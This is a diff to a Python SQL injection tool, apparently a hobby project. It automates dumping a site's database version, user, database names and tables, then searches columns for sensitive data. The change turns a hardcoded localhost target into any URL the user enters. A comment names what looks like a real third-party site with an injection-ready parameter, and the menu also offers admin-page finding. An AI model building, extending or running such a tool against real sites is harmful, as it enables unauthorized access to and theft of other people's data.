@@ -1,13 +1,14 @@
 import s_data
 import dbs
 import replaces
-import binascii
 from prints import *
 from requests import *
 from find_total_cols import ft_cols, uni_cols
 from vulnerable import vuln, f_vuln_col
 from response import site_alive
 from search_in_columns import search_in_columns
+import options
+# www.gpavlos.gr/print.php?id=1'
 
 
 class InjectDatabase:
@@ -39,18 +40,18 @@ class InjectDatabase:
 
     def database_information(self):
         self.db_version = dbs.version(self.site)
-        print("SQL Version: %s" % self.db_version)
+        print "SQL Version: %s" % self.db_version
 
         self.db_user = dbs.user(self.site)
-        print("Current user is: %s" % self.db_user)
+        print "Current user is: %s" % self.db_user
 
         self.db_names = dbs.names(self.site)
-        print_data(self.db_names, ['Databases'])
+        print_cols_tables(self.db_names, 'Databases')
 
         self.working_on_db = dbs.working_db(self.site)
-        print("You are on: %s database" % self.working_on_db)
+        print "You are on: %s database" % self.working_on_db
 
-        change_database = input("Do you want to change database? (y/n): ")
+        change_database = raw_input("Do you want to change database? (y/n): ")
         if change_database == "y":
             self.change_database()
         else:
@@ -61,46 +62,44 @@ class InjectDatabase:
         self.tables = s_data.search_for(self.the_page)
 
         if not len(self.tables):
-            print("Could not get the tables, program will exit.")
+            print "Could not get the tables, program will exit."
             exit()
 
-        print_data(self.tables, ['Tables Found'])
+        print_cols_tables(self.tables, 'Tables Found')
         self.site = replaces.repl(self.site, 3, self.working_on_db)
         if not self.based == '':
             self.site = site.replace(self.based, '')
 
     def select_table(self):
-        print("Give the table: ")
-        self.table_choose = input(">>> ")
+        print "Give the table: "
+        self.table_choose = raw_input(">>> ")
         while not(self.table_choose in self.tables):
             print("Wrong input. Give the table: ")
-            self.table_choose = input(">>> ")
+            self.table_choose = raw_input(">>> ")
 
-        self.table_choose = bytes(self.table_choose, encoding='utf-8')
-        self.table_choose = binascii.hexlify(self.table_choose)
-        self.table_choose = self.table_choose .decode()
+        self.table_choose = self.table_choose.encode("hex")
 
     def search_data_from_columns(self):
         self.sensitive_data = search_in_columns(
-            self.site, self.table_choose, self.based)
+            self.site, self.table_choose, self.based, self.working_on_db)
 
     # Prepei na to kanw etsi wste an metepeita 8elei na alla3ei o xrhsths database
     # na mporei na to kanei apo edw giati twra den ginete
     def change_database(self):
-        print_data(self.db_names, ['Databases'])
-        self.working_on_db = input(
+        print_cols_tables(self.db_names, 'Databases')
+        self.working_on_db = raw_input(
             "On which Database you want to work on?: ")
         while self.working_on_db not in self.db_names:
-            self.working_on_db = input("Wrong Input!\nOn which Database you want to work on?: ")
+            self.working_on_db = raw_input("Wrong Input!\nOn which Database you want to work on?: ")
 
         self.site = replaces.repl(self.site, 2, self.working_on_db)
 
     # na diagrafei meta
     def option1(self):
-        print(1)
+        print 1
 
     def option2(self):
-        print(2)
+        print 2
 
 
 if __name__ == '__main__':
@@ -108,16 +107,16 @@ if __name__ == '__main__':
     option = 0
 
     while not option:
-        print("1.| Inject DB from site.")
-        print("2.| Hash ID.")
-        print("3.| Find admin page.")
-        option = input(">>> ")
+        print "1.| Inject DB from site."
+        print "2.| Hash ID."
+        print "3.| Find admin page."
+        option = raw_input(">>> ")
 
     if option == "1":
         flag = 1
 
         while flag:
-            site = "http://127.0.0.1:81/sql.php?id=1'"
+            site = raw_input("Give the url: ")
 
             if "'" in site:
                 site = site_alive(site)
@@ -132,6 +131,6 @@ if __name__ == '__main__':
             find_data.find_tables_of_database()
             find_data.select_table()
             find_data.search_data_from_columns()
-    #  elif option == "2":
-        #  prepei na vrw swsto onoma gia to arxeio.
-        #  options.what_to_do("1")
+    elif option == "2":
+        # prepei na vrw swsto onoma gia to arxeio.
+        options.what_to_do("1")
